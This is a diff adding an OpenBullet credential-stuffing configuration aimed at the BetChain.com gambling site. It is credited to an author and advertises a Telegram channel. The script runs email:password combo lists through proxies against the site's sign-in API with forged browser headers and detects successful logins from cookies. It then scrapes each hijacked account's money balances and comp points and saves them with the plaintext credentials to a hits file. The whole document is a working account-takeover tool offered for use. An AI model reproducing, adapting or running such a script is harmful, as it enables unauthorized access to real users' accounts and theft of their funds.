@@ -1,0 +1,100 @@
+[SETTINGS]
+{
+  "Name": "BetChain.Com",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-06-12T04:47:36.3024138+02:00",
+  "AdditionalInfo": "T.me/BruteForce | Capture Type: Point & Amount | Fast | Save Hits with Capture Text File on Open Bullet Root Folder (BetChain.txt) | CPM: 200_2000",
+  "Author": "@H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#UA FUNCTION GetRandomUA -> VAR "UA" 
+
+#Lenght FUNCTION Length "{\"user\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" -> VAR "Lenght" 
+
+#POST REQUEST POST "https://www.betchain.com/api/users/sign_in" 
+  CONTENT "{\"user\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/vnd.softswiss.v1+json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: fa,en-US;q=0.9,en;q=0.8" 
+  HEADER "content-length: <Lenght>" 
+  HEADER "origin: https://www.betchain.com" 
+  HEADER "referer: https://www.betchain.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"Invalid Email or password.\"" 
+    KEY "not_found_in_database" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES>" Contains "original_user_id" 
+
+#GetCap REQUEST GET "https://www.betchain.com/profile" 
+  
+  HEADER "user-agent: <UA>" 
+
+#Points PARSE "<SOURCE>" LR "<h2>Comp Points</h2><p>Status Comp Points:" "</p>" CreateEmpty=FALSE -> CAP "Points" 
+
+#Kir PARSE "<SOURCE>" LR "<li class='balance'>" "<li class='actions'>" -> VAR "Kir" 
+
+#Kir1 PARSE "<Kir>" LR "class='amount'>" "</div></a></div>" Recursive=TRUE -> VAR "Kir1" 
+
+#Kir2 FUNCTION Replace "</div><div class='currency'>" " " "<Kir1>" -> VAR "Kir2" 
+
+#Amount FUNCTION Replace "," " / " "<Kir2>" -> CAP "Amount" 
+
+#Kir3 FUNCTION Replace "[" "" "<Amount>" -> VAR "Kir3" 
+
+#Kir4 FUNCTION Replace "]" "" "<Kir3>" -> VAR "Kir4" 
+
+#Kir5 FUNCTION Replace " / " "\\n" "<Kir4>" -> VAR "Kir5" 
+
+#Save UTILITY File "BetChain.txt" AppendLines "<<<<<<=Account=>>>>>>\\nCombo: <USER>:<PASS>\\nEmail: <USER>\\nPassword: <PASS>\\n<<<<<<=Information=>>>>>>\\nAmount:\\n <Kir5>\\nPoints: <Points>\\n==========================" -> VAR "Save" 
+
